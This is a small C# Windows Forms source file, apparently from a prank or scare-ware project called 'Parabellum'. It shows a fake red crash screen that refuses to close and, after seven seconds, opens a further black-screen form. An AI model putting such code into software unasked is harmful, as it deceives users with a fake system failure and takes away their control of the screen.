using System;
using System.Threading;
using System.Windows.Forms;
using Vanara.PInvoke;
using static Vanara.PInvoke.User32;

namespace Parabellum
{
    public partial class FakeRSOD : Form
    {
        public FakeRSOD()
        {
            InitializeComponent();
        }

        private void FakeBSOD_Load(object sender, EventArgs e)
        {
            var timer = new System.Threading.Timer((obj) =>
            {
                new ScreenBlack().ShowDialog();
            }, null, 7000, Timeout.Infinite);
        }

        private void FakeRSOD_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
